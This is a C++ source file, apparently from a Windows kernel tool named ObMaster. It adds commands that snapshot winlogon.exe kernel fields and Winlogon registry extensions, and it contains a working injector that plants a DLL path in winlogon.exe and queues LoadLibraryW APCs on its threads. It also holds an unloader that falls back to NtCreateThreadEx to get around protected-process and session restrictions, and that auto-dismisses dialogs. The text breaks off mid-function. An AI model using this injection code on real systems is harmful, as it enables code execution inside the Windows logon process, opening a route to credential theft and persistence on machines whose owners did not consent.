#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "ansi.h"

extern IDriverBackend* g_drv;

// ─── /wlmon [ms] ──────────────────────────────────────────────────────────────
// Monitor winlogon.exe kernel state + registered winlogon extensions.
//
// Snapshot includes:
//   - EPROCESS fields: PID, token ptr, protection byte, session, thread count
//   - Registry: Notification Packages, Credential Providers, AppInit DLLs,
//               Userinit, Shell, GinaDLL (Winlogon key)
//   - Loaded modules in winlogon.exe (PEB.Ldr via ReadProcessMemory w/ SYSTEM token)
//
// If [ms] is given, re-runs every <ms> milliseconds and highlights changes.
//
// ─── /wlinject <dll> ──────────────────────────────────────────────────────────
// Inject a DLL into winlogon.exe via user-mode APC.
//
// Requires SYSTEM token in calling process (use /elevate-self first).
//
// Technique:
//   1. FindWinlogonPid()
//   2. OpenProcess(PROCESS_ALL_ACCESS, winlogon_pid)  — allowed with SYSTEM token
//   3. VirtualAllocEx + WriteProcessMemory → plant DLL path string
//   4. Enumerate threads, find winlogon's own threads
//   5. QueueUserAPC(LoadLibraryW, thread, dll_path_va) on each thread
//      Winlogon has alertable threads (WaitForSingleObjectEx / SleepEx loops)
//      At least one will pick up the APC on the next alertable wait.

// ── helpers ───────────────────────────────────────────────────────────────────

static DWORD FindWinlogonPid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{ sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe))
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

// Read a REG_MULTI_SZ or REG_SZ value and return each string.
static std::vector<std::string> ReadRegStrings(HKEY root, const wchar_t* subkey, const wchar_t* value) {
    std::vector<std::string> out;
    HKEY hk{};
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &hk) != ERROR_SUCCESS) return out;
    DWORD type = 0, size = 0;
    RegQueryValueExW(hk, value, nullptr, &type, nullptr, &size);
    if (!size) { RegCloseKey(hk); return out; }
    std::vector<BYTE> buf(size + 4, 0);
    RegQueryValueExW(hk, value, nullptr, &type, buf.data(), &size);
    RegCloseKey(hk);

    auto push = [&](const wchar_t* ws) {
        if (!ws || !*ws) return;
        int n = WideCharToMultiByte(CP_UTF8, 0, ws, -1, nullptr, 0, nullptr, nullptr);
        if (n <= 0) return;
        std::string s(n - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, ws, -1, s.data(), n, nullptr, nullptr);
        out.push_back(std::move(s));
    };

    if (type == REG_MULTI_SZ) {
        const wchar_t* p = (const wchar_t*)buf.data();
        while (*p) { push(p); p += wcslen(p) + 1; }
    } else {
        push((const wchar_t*)buf.data());
    }
    return out;
}

// Enumerate subkey names under root\subkey.
static std::vector<std::string> EnumSubkeys(HKEY root, const wchar_t* subkey) {
    std::vector<std::string> out;
    HKEY hk{};
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &hk) != ERROR_SUCCESS) return out;
    wchar_t name[256];
    DWORD idx = 0, nlen;
    while (true) {
        nlen = 256;
        if (RegEnumKeyExW(hk, idx++, name, &nlen, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
        int n = WideCharToMultiByte(CP_UTF8, 0, name, -1, nullptr, 0, nullptr, nullptr);
        if (n > 1) { std::string s(n - 1, 0); WideCharToMultiByte(CP_UTF8, 0, name, -1, s.data(), n, nullptr, nullptr); out.push_back(s); }
    }
    RegCloseKey(hk);
    return out;
}

// ── snapshot struct ───────────────────────────────────────────────────────────

struct WlSnapshot {
    // Kernel state
    DWORD    pid          = 0;
    DWORD64  eprocess     = 0;
    DWORD64  tokenPtr     = 0;   // clean pointer (low bits stripped)
    BYTE     protection   = 0;
    DWORD    session      = 0;
    DWORD    threadCount  = 0;

    // Registry extensions
    std::vector<std::string> notifyPackages;
    std::vector<std::string> credProviders;
    std::vector<std::string> appinitDlls;
    std::string userinit;
    std::string shell;
    std::string ginaDll;

    // Loaded modules (from PEB.Ldr via ReadProcessMemory)
    std::vector<std::string> modules;
};

static const DWORD EP_ThreadCount = 0x5f0;   // EPROCESS.ActiveThreads (ULONG)
static const DWORD EP_Token       = 0x4b8;   // EPROCESS.Token (EX_FAST_REF)
static const DWORD EP_Protection  = 0x87a;   // EPROCESS.Protection (_PS_PROTECTION)

static WlSnapshot TakeSnapshot(DWORD pid) {
    WlSnapshot s;
    s.pid = pid;

    // ── Kernel fields ─────────────────────────────────────────────────────────
    s.eprocess = KUtil::FindEPROCESS(pid);
    if (s.eprocess) {
        DWORD64 tokenRaw = g_drv->Rd64(s.eprocess + EP_Token);
        s.tokenPtr    = tokenRaw & ~0xFULL;
        s.protection  = g_drv->Rd8(s.eprocess + EP_Protection);
        s.threadCount = g_drv->Rd32(s.eprocess + EP_ThreadCount);
    }
    // Use Win32 API for session ID — avoids relying on a version-specific offset.
    ProcessIdToSessionId(pid, &s.session);

    // ── Registry ──────────────────────────────────────────────────────────────
    static const wchar_t* WL_KEY =
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    static const wchar_t* CP_KEY =
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Authentication\\Credential Providers";

    s.notifyPackages = ReadRegStrings(HKEY_LOCAL_MACHINE, WL_KEY, L"Notification Packages");
    s.appinitDlls    = ReadRegStrings(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", L"AppInit_DLLs");
    {
        auto v = ReadRegStrings(HKEY_LOCAL_MACHINE, WL_KEY, L"Userinit");
        s.userinit = v.empty() ? "" : v[0];
        v = ReadRegStrings(HKEY_LOCAL_MACHINE, WL_KEY, L"Shell");
        s.shell = v.empty() ? "" : v[0];
        v = ReadRegStrings(HKEY_LOCAL_MACHINE, WL_KEY, L"GinaDLL");
        s.ginaDll = v.empty() ? "(none)" : v[0];
    }
    s.credProviders = EnumSubkeys(HKEY_LOCAL_MACHINE, CP_KEY);

    // ── Loaded modules (PEB.Ldr) ──────────────────────────────────────────────
    // Needs PROCESS_QUERY_INFORMATION | PROCESS_VM_READ — available when SYSTEM.
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProc) {
        HMODULE mods[256]; DWORD needed = 0;
        if (EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
            DWORD count = min(needed / sizeof(HMODULE), 256u);
            for (DWORD i = 0; i < count; i++) {
                wchar_t path[MAX_PATH]{};
                if (GetModuleFileNameExW(hProc, mods[i], path, MAX_PATH)) {
                    // Keep only the filename portion
                    const wchar_t* fn = wcsrchr(path, L'\\');
                    fn = fn ? fn + 1 : path;
                    int n = WideCharToMultiByte(CP_UTF8, 0, fn, -1, nullptr, 0, nullptr, nullptr);
                    if (n > 1) {
                        std::string mod(n - 1, 0);
                        WideCharToMultiByte(CP_UTF8, 0, fn, -1, mod.data(), n, nullptr, nullptr);
                        s.modules.push_back(mod);
                    }
                }
            }
        }
        CloseHandle(hProc);
    }

    return s;
}

static void PrintSnapshot(const WlSnapshot& s, const WlSnapshot* prev) {
    // ── Kernel state ──────────────────────────────────────────────────────────
    printf("%s[winlogon.exe]%s  PID=%u  EPROCESS=0x%llX\n",
           A_CYAN, A_RESET, s.pid, s.eprocess);

    auto chg = [&](const char* label, bool changed) {
        printf("  %s%-20s%s", changed ? A_YELLOW : "", label, A_RESET);
    };

    bool tChg = prev && (s.tokenPtr    != prev->tokenPtr);
    bool pChg = prev && (s.protection  != prev->protection);
    bool sChg = prev && (s.session     != prev->session);
    bool thChg= prev && (s.threadCount != prev->threadCount);

    chg("Token:", tChg);
    printf(" 0x%llX%s\n", s.tokenPtr, tChg ? "  ← CHANGED" : "");
    chg("Protection:", pChg);
    printf(" 0x%02X (%s)%s\n", s.protection,
           s.protection == 0x61 ? "PPL/WinTcb" :
           s.protection == 0x62 ? "PP/WinTcb"  :
           s.protection == 0x00 ? "NONE"        : "other",
           pChg ? "  ← CHANGED" : "");
    chg("Session:", sChg);
    printf(" %u%s\n", s.session, sChg ? "  ← CHANGED" : "");
    chg("Threads:", thChg);
    printf(" %u%s\n", s.threadCount, thChg ? "  ← CHANGED" : "");

    // ── Registry ──────────────────────────────────────────────────────────────
    printf("\n  %s[Registry — Winlogon key]%s\n", A_DIM, A_RESET);
    printf("  %-20s %s\n", "Userinit:", s.userinit.c_str());
    printf("  %-20s %s\n", "Shell:", s.shell.c_str());
    printf("  %-20s %s\n", "GinaDLL:", s.ginaDll.c_str());

    printf("  %-20s", "Notification Pkgs:");
    if (s.notifyPackages.empty()) printf(" (none)\n");
    else { for (auto& p : s.notifyPackages) printf(" %s", p.c_str()); printf("\n"); }

    printf("  %-20s", "AppInit DLLs:");
    if (s.appinitDlls.empty()) printf(" (none)\n");
    else { for (auto& p : s.appinitDlls) printf(" %s", p.c_str()); printf("\n"); }

    printf("\n  %s[Credential Providers]%s\n", A_DIM, A_RESET);
    if (s.credProviders.empty()) printf("  (none)\n");
    else for (auto& cp : s.credProviders) printf("  {%s}\n", cp.c_str());

    // ── Loaded modules ────────────────────────────────────────────────────────
    printf("\n  %s[Loaded modules (%zu)]%s\n", A_DIM, s.modules.size(), A_RESET);
    if (s.modules.empty()) {
        printf("  (no access — need SYSTEM token; use /elevate-self first)\n");
    } else {
        // Check for new modules vs prev snapshot
        for (auto& m : s.modules) {
            bool isNew = false;
            if (prev) {
                isNew = true;
                for (auto& pm : prev->modules) if (pm == m) { isNew = false; break; }
            }
            printf("  %s%s%s\n", isNew ? A_YELLOW : "", m.c_str(), isNew ? "  ← NEW" : A_RESET);
            if (isNew) printf("%s", A_RESET);
        }
    }
    printf("\n");
}

void CmdWlMon(int intervalMs) {
    SetConsoleOutputCP(CP_UTF8);

    DWORD pid = FindWinlogonPid();
    if (!pid) {
        printf("%s[!]%s winlogon.exe not found.\n", A_RED, A_RESET);
        return;
    }

    WlSnapshot prev{};
    bool hasPrev = false;
    int round = 0;

    while (true) {
        if (intervalMs > 0) {
            printf("%s── round %d ──────────────────────────────────%s\n",
                   A_DIM, ++round, A_RESET);
        }

        WlSnapshot cur = TakeSnapshot(pid);
        PrintSnapshot(cur, hasPrev ? &prev : nullptr);
        hasPrev = true;
        prev = cur;

        if (intervalMs <= 0) break;
        printf("  (refreshing in %d ms — press Ctrl+C to stop)\n\n", intervalMs);
        Sleep(intervalMs);
    }
}

// ─── /wlinject <dll> ──────────────────────────────────────────────────────────

void CmdWlInject(const char* dllPathA) {
    SetConsoleOutputCP(CP_UTF8);

    // Convert DLL path to absolute wide string
    wchar_t dllPath[MAX_PATH]{};
    {
        wchar_t tmp[MAX_PATH]{};
        MultiByteToWideChar(CP_ACP, 0, dllPathA, -1, tmp, MAX_PATH - 1);
        if (!GetFullPathNameW(tmp, MAX_PATH, dllPath, nullptr)) {
            wcsncpy_s(dllPath, tmp, MAX_PATH - 1);
        }
    }
    {
        // Verify the file exists before injecting
        if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
            printf("%s[!]%s DLL not found: %ls\n", A_RED, A_RESET, dllPath);
            return;
        }
    }

    DWORD pid = FindWinlogonPid();
    if (!pid) {
        printf("%s[!]%s winlogon.exe not found.\n", A_RED, A_RESET);
        return;
    }
    printf("%s[*]%s winlogon.exe PID = %u\n", A_CYAN, A_RESET, pid);
    printf("%s[*]%s DLL: %ls\n", A_CYAN, A_RESET, dllPath);

    // ── Open winlogon with full access ────────────────────────────────────────
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) {
        printf("%s[!]%s OpenProcess failed (err %lu) — need SYSTEM token.\n",
               A_RED, A_RESET, GetLastError());
        printf("    Run: ObMaster /elevate-self  then retry.\n");
        return;
    }
    printf("%s[+]%s OpenProcess OK.\n", A_GREEN, A_RESET);

    // ── Plant DLL path string in winlogon's VA space ──────────────────────────
    SIZE_T pathBytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID remotePath = VirtualAllocEx(hProc, nullptr, pathBytes,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        printf("%s[!]%s VirtualAllocEx failed (err %lu)\n", A_RED, A_RESET, GetLastError());
        CloseHandle(hProc); return;
    }
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remotePath, dllPath, pathBytes, &written) || written != pathBytes) {
        printf("%s[!]%s WriteProcessMemory failed (err %lu)\n", A_RED, A_RESET, GetLastError());
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc); return;
    }
    printf("%s[+]%s DLL path planted at 0x%llX in winlogon VA space.\n",
           A_GREEN, A_RESET, (DWORD64)remotePath);

    // ── Resolve LoadLibraryW in kernel32 ─────────────────────────────────────
    // Address is the same in all processes (kernel32 is always at same VA due to ASLR
    // base shared across session 0 processes on the same boot).
    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!pLoadLib) {
        printf("%s[!]%s LoadLibraryW not found in kernel32.\n", A_RED, A_RESET);
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc); return;
    }
    printf("%s[*]%s LoadLibraryW @ 0x%llX\n", A_CYAN, A_RESET, (DWORD64)pLoadLib);

    // ── Queue APC on each winlogon thread ─────────────────────────────────────
    // Winlogon runs multiple alertable threads. QueueUserAPC on all of them —
    // the first one to enter an alertable wait will call LoadLibraryW.
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("%s[!]%s Thread snapshot failed.\n", A_RED, A_RESET);
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc); return;
    }

    THREADENTRY32 te{ sizeof(te) };
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE hThr = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (!hThr) continue;
            if (QueueUserAPC((PAPCFUNC)pLoadLib, hThr, (ULONG_PTR)remotePath)) {
                printf("%s[+]%s APC queued on TID %u\n", A_GREEN, A_RESET, te.th32ThreadID);
                queued++;
            } else {
                printf("%s[!]%s QueueUserAPC failed on TID %u (err %lu)\n",
                       A_YELLOW, A_RESET, te.th32ThreadID, GetLastError());
            }
            CloseHandle(hThr);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    if (queued == 0) {
        printf("%s[!]%s No threads queued. DLL not injected.\n", A_RED, A_RESET);
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
    } else {
        printf("%s[+]%s APC queued on %d thread(s).\n", A_GREEN, A_RESET, queued);
        printf("    DLL will load when winlogon enters an alertable wait.\n");
        printf("    Verify: ObMaster /wlmon  (watch Loaded modules for your DLL)\n");
        // Note: do NOT free remotePath — winlogon needs it until LoadLibrary completes.
        // It's a small leak (~MAX_PATH bytes) in winlogon's VA; acceptable for security tools.
    }

    CloseHandle(hProc);
}

// ─── Window close helpers (shared by /wnd-close and /wluninject auto-dismiss) ─

struct FindDeskCtx {
    HWND    target;
    HDESK   found;
    wchar_t name[256];
    bool    hwndFound;
};

static BOOL CALLBACK FindDesktopForHwnd(HWND hwnd, LPARAM lp) {
    auto* ctx = reinterpret_cast<FindDeskCtx*>(lp);
    if (hwnd == ctx->target) { ctx->hwndFound = true; return FALSE; }
    return TRUE;
}

static BOOL CALLBACK FindDeskProc(LPWSTR deskName, LPARAM lp) {
    auto* ctx = reinterpret_cast<FindDeskCtx*>(lp);
    HDESK hDesk = OpenDesktopW(deskName, 0, FALSE,
        DESKTOP_ENUMERATE | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS);
    if (!hDesk) return TRUE;
    ctx->hwndFound = false;
    EnumDesktopWindows(hDesk, FindDesktopForHwnd, lp);
    if (ctx->hwndFound) {
        ctx->found = hDesk;
        wcsncpy_s(ctx->name, deskName, 255);
        return FALSE;
    }
    CloseDesktop(hDesk);
    return TRUE;
}

static bool DismissHwnd(HWND hwnd, bool verbose = true) {
    HWINSTA hWinSta = OpenWindowStationW(L"WinSta0", FALSE,
        WINSTA_ENUMDESKTOPS | WINSTA_ACCESSGLOBALATOMS);
    if (!hWinSta) return false;
    FindDeskCtx fdctx{ hwnd, nullptr, {}, false };
    EnumDesktopsW(hWinSta, FindDeskProc, (LPARAM)&fdctx);
    CloseWindowStation(hWinSta);
    if (!fdctx.found) return false;
    if (verbose)
        printf("%s[+]%s Found on desktop: %ls\n", A_GREEN, A_RESET, fdctx.name);
    HDESK hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
    if (!SetThreadDesktop(fdctx.found)) { CloseDesktop(fdctx.found); return false; }
    wchar_t clsW[256]{};
    GetClassNameW(hwnd, clsW, 255);
    bool isDialog = (_wcsicmp(clsW, L"#32770") == 0);
    bool ok = false;
    if (isDialog) {
        static const int kBtnIds[] = { IDOK, IDYES, IDCANCEL, IDNO, 0 };
        for (int id : kBtnIds) {
            if (!id) break;
            HWND btn = GetDlgItem(hwnd, id);
            if (!btn) continue;
            wchar_t txt[64]{}; GetWindowTextW(btn, txt, 63);
            if (verbose) printf("%s[*]%s Clicking button id=%d \"%ls\"\n", A_CYAN, A_RESET, id, txt);
            SendMessageW(btn, BM_CLICK, 0, 0);
            ok = true; break;
        }
        if (!ok) ok = (PostMessageW(hwnd, WM_CLOSE, 0, 0) != FALSE);
    } else {
        ok = (PostMessageW(hwnd, WM_CLOSE, 0, 0) != FALSE);
    }
    SetThreadDesktop(hOrigDesk);
    CloseDesktop(fdctx.found);
    return ok;
}

struct FindDlgCtx { DWORD pid; HWND result; };
static BOOL CALLBACK FindDlgWndProc(HWND hwnd, LPARAM lp) {
    auto* ctx = reinterpret_cast<FindDlgCtx*>(lp);
    DWORD wpid = 0; GetWindowThreadProcessId(hwnd, &wpid);
    if (wpid != ctx->pid) return TRUE;
    wchar_t cls[64]{}; GetClassNameW(hwnd, cls, 63);
    if (_wcsicmp(cls, L"#32770") == 0) { ctx->result = hwnd; return FALSE; }
    return TRUE;
}
struct FindDlgDeskCtx { FindDlgCtx* dlg; };
static BOOL CALLBACK FindDlgDeskProc(LPWSTR deskName, LPARAM lp) {
    auto* ctx = reinterpret_cast<FindDlgDeskCtx*>(lp);
    HDESK hDesk = OpenDesktopW(deskName, 0, FALSE, DESKTOP_ENUMERATE | DESKTOP_READOBJECTS);
    if (!hDesk) return TRUE;
    ctx->dlg->result = nullptr;
    EnumDesktopWindows(hDesk, FindDlgWndProc, (LPARAM)ctx->dlg);
    CloseDesktop(hDesk);
    return ctx->dlg->result ? FALSE : TRUE;
}
static HWND FindDialogByPid(DWORD pid) {
    HWINSTA hWinSta = OpenWindowStationW(L"WinSta0", FALSE,
        WINSTA_ENUMDESKTOPS | WINSTA_ACCESSGLOBALATOMS);
    if (!hWinSta) return nullptr;
    FindDlgCtx dlgCtx{ pid, nullptr };
    FindDlgDeskCtx deskCtx{ &dlgCtx };
    EnumDesktopsW(hWinSta, FindDlgDeskProc, (LPARAM)&deskCtx);
    CloseWindowStation(hWinSta);
    return dlgCtx.result;
}

// ─── /wluninject <dll-name> ───────────────────────────────────────────────────
// Unload a previously-injected DLL from winlogon.exe via FreeLibrary APC.
//
// <dll-name> is matched against the loaded module list (filename only, case-insensitive).
// FreeLibrary has the same signature as PAPCFUNC (ULONG_PTR param = HMODULE),
// so we queue it on all winlogon threads just like /wlinject.

// ── Read a named export RVA from a remote process's PE (handles 32-bit targets) ──
static DWORD RemoteGetExportRVA(HANDLE hProc, ULONG_PTR base, const char* funcName) {
    SIZE_T rd{};
    IMAGE_DOS_HEADER dos{};
    if (!ReadProcessMemory(hProc, (LPCVOID)base, &dos, sizeof(dos), &rd)
        || dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // Read NT headers as 32-bit (works for both; Optional header sizes differ but
    // DataDirectory[0] offset is the same in 32/64-bit IMAGE_OPTIONAL_HEADER)
    IMAGE_NT_HEADERS32 nth{};
    if (!ReadProcessMemory(hProc, (LPCVOID)(base + dos.e_lfanew), &nth, sizeof(nth), &rd)) return 0;

    DWORD expRVA = nth.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return 0;

    IMAGE_EXPORT_DIRECTORY exp{};
    if (!ReadProcessMemory(hProc, (LPCVOID)(base + expRVA), &exp, sizeof(exp), &rd)) return 0;

    std::vector<DWORD> nameRVAs(exp.NumberOfNames);
    std::vector<WORD>  ordinals(exp.NumberOfNames);
    std::vector<DWORD> funcRVAs(exp.NumberOfFunctions);
    ReadProcessMemory(hProc, (LPCVOID)(base + exp.AddressOfNames),
                      nameRVAs.data(), nameRVAs.size() * 4, &rd);
    ReadProcessMemory(hProc, (LPCVOID)(base + exp.AddressOfNameOrdinals),
                      ordinals.data(), ordinals.size() * 2, &rd);
    ReadProcessMemory(hProc, (LPCVOID)(base + exp.AddressOfFunctions),
                      funcRVAs.data(), funcRVAs.size() * 4, &rd);

    for (DWORD i = 0; i < exp.NumberOfNames; i++) {
        char name[128]{};
        ReadProcessMemory(hProc, (LPCVOID)(base + nameRVAs[i]), name, sizeof(name) - 1, &rd);
        if (strcmp(name, funcName) == 0) return funcRVAs[ordinals[i]];
    }
    return 0;
}

// ── Resolve FreeLibrary for the target process (handles 32-bit WOW64 targets) ─
static LPTHREAD_START_ROUTINE GetRemoteFreeLibrary(HANDLE hProc) {
    BOOL isWow64 = FALSE;
    IsWow64Process(hProc, &isWow64);

    if (!isWow64) {
        // 64-bit target: our own kernel32.dll address is valid in the remote process
        return (LPTHREAD_START_ROUTINE)
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    }

    // 32-bit (WOW64) target: find 32-bit kernel32.dll in the remote process and
    // parse its export table to get the real FreeLibrary address.
    HMODULE mods[256]; DWORD needed = 0;
    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_32BIT))
        return nullptr;

    DWORD cnt = min(needed / sizeof(HMODULE), 256u);
    for (DWORD i = 0; i < cnt; i++) {
        wchar_t name[MAX_PATH]{};
        GetModuleFileNameExW(hProc, mods[i], name, MAX_PATH);
        const wchar_t* fn = wcsrchr(name, L'\\'); fn = fn ? fn + 1 : name;
        if (_wcsicmp(fn, L"kernel32.dll") == 0) {
            ULONG_PTR base = (ULONG_PTR)mods[i];
            DWORD rva = RemoteGetExportRVA(hProc, base, "FreeLibrary");
            if (rva) return (LPTHREAD_START_ROUTINE)(base + rva);
        }
    }
    return nullptr;
}

// ── Shared helper: unload a DLL from an already-open process handle ──────────
// Returns: 0=already gone, >0=rounds used, -1=failed, -2=gave up
static int UnloadDllFromProcess(DWORD pid, const wchar_t* searchW, bool verbose = true) {
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) return -1;

    // Check early if the process is already exiting
    DWORD earlyExit = STILL_ACTIVE;
    GetExitCodeProcess(hProc, &earlyExit);
    if (earlyExit != STILL_ACTIVE) {
        if (verbose) printf("%s[*]%s  Process already exiting — DLL freed on exit.\n", A_CYAN, A_RESET);
        CloseHandle(hProc); return 0;
    }

    LPTHREAD_START_ROUTINE pFreeLib = GetRemoteFreeLibrary(hProc);
    if (!pFreeLib) {
        // Re-check — might have died between the scan and now
        GetExitCodeProcess(hProc, &earlyExit);
        if (earlyExit != STILL_ACTIVE) {
            if (verbose) printf("%s[*]%s  Process exited while resolving FreeLibrary — DLL freed.\n", A_CYAN, A_RESET);
            CloseHandle(hProc); return 0;
        }
        if (verbose) printf("%s[!]%s  Could not resolve remote FreeLibrary (err %lu).\n",
                            A_RED, A_RESET, GetLastError());
        CloseHandle(hProc); return -1;
    }

    BOOL isWow64 = FALSE;
    IsWow64Process(hProc, &isWow64);

    const int MAX_ROUNDS = 16;
    int rounds = 0;

    while (rounds < MAX_ROUNDS) {
        HMODULE mods[256]; DWORD needed = 0;
        HMODULE curMod = nullptr;
        if (EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
            DWORD cnt = min(needed / sizeof(HMODULE), 256u);
            for (DWORD i = 0; i < cnt; i++) {
                wchar_t p[MAX_PATH]{};
                GetModuleFileNameExW(hProc, mods[i], p, MAX_PATH);
                const wchar_t* fn = wcsrchr(p, L'\\'); fn = fn ? fn + 1 : p;
                if (_wcsicmp(fn, searchW) == 0) { curMod = mods[i]; break; }
            }
        }
        if (!curMod) break;  // gone

        rounds++;
        if (verbose)
            printf("%s[*]%s  Round %d: FreeLibrary(0x%llX)%s...\n",
                   A_CYAN, A_RESET, rounds, (DWORD64)curMod,
                   isWow64 ? " [WOW64]" : "");

        // Try CreateRemoteThread first; if it fails, fall back to NtCreateThreadEx
        // (bypasses some PPL restrictions and handles cross-session edge cases)
        HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0,
            pFreeLib, (LPVOID)curMod, 0, nullptr);
        if (!hThread) {
            DWORD crtErr = GetLastError();
            DWORD exitCode = STILL_ACTIVE;
            GetExitCodeProcess(hProc, &exitCode);
            if (verbose)
                printf("%s[dbg]%s  CRT failed err=%lu  exitCode=%lu  pFreeLib=0x%llX  WOW64=%d\n",
                       A_YELLOW, A_RESET, crtErr, exitCode, (DWORD64)pFreeLib, isWow64);
            if (exitCode != STILL_ACTIVE) {
                if (verbose) printf("%s[*]%s  Process already exiting — DLL freed on exit.\n", A_CYAN, A_RESET);
                CloseHandle(hProc); return rounds == 0 ? 0 : rounds;
            }
            // Try NtCreateThreadEx to bypass PPL / session restrictions
            typedef NTSTATUS(WINAPI* PfnNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
            static PfnNtCTE NtCTE = (PfnNtCTE)GetProcAddress(
                GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
            NTSTATUS ntSt = 0;
            if (NtCTE) {
                ntSt = NtCTE(&hThread, THREAD_ALL_ACCESS, nullptr, hProc,
                    pFreeLib, (PVOID)curMod, 0, 0, 0, 0, nullptr);
                if (ntSt != 0) hThread = nullptr;
            }
            if (!hThread) {
                if (verbose)
                    printf("%s[dbg]%s  NtCreateThreadEx NTSTATUS=0x%08lX\n",
                           A_YELLOW, A_RESET, (ULONG)ntSt);
                SetLastError(crtErr);
                CloseHandle(hProc); return -1;
            }
        }

        DWORD wait = WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);

        if (wait != WAIT_OBJECT_0) {
            if (verbose) printf("%s[!]%s  Timed out — trying to dismiss blocking dialog...\n", A_YELLOW, A_RESET);
            HWND dlg = FindDialogByPid(pid);
            if (dlg && DismissHwnd(dlg, false)) { Sleep(500); continue; }
            CloseHandle(hProc); return -2;
        }
        Sleep(100);
    }

    CloseHandle(hProc);
    if (rounds >= MAX_ROUNDS) return -2;
    return rounds;
}

void CmdWlUninject(const char* dllNameA) {
    SetConsoleOutputCP(CP_UTF8);

    DWORD pid = FindWinlogonPid();
    if (!pid) { printf("%s[!]%s winlogon.exe not found.\n", A_RED, A_RESET); return; }
    printf("%s[*]%s winlogon.exe PID = %u\n", A_CYAN, A_RESET, pid);

    wchar_t searchW[MAX_PATH]{};
    MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, searchW, MAX_PATH - 1);

    // Print module path before unloading
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProc) {
        HMODULE mods[256]; DWORD needed = 0;
        if (EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
            DWORD count = min(needed / sizeof(HMODULE), 256u);
            for (DWORD i = 0; i < count; i++) {
                wchar_t path[MAX_PATH]{};
                GetModuleFileNameExW(hProc, mods[i], path, MAX_PATH);
                const wchar_t* fn = wcsrchr(path, L'\\'); fn = fn ? fn + 1 : path;
                if (_wcsicmp(fn, searchW) == 0) {
                    printf("%s[+]%s Found: %ls @ 0x%llX\n", A_GREEN, A_RESET, path, (DWORD64)mods[i]);
                    break;
                }
            }
        }
        CloseHandle(hProc);
    }

    LPTHREAD_START_ROUTINE pFreeLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    if (!pFreeLib) { printf("%s[!]%s FreeLibrary not found.\n", A_RED, A_RESET); return; }
    printf("%s[*]%s FreeLibrary @ 0x%llX\n", A_CYAN, A_RESET, (DWORD64)pFreeLib);

    int r = UnloadDllFromProcess(pid, searchW, true);
    if (r == 0)  printf("%s[+]%s Module already unloaded.\n", A_GREEN, A_RESET);
    else if (r > 0) printf("%s[+]%s Unloaded after %d FreeLibrary call(s).\n", A_GREEN, A_RESET, r);
    else if (r == -1) printf("%s[!]%s OpenProcess / CreateRemoteThread failed (err %lu)\n", A_RED, A_RESET, GetLastError());
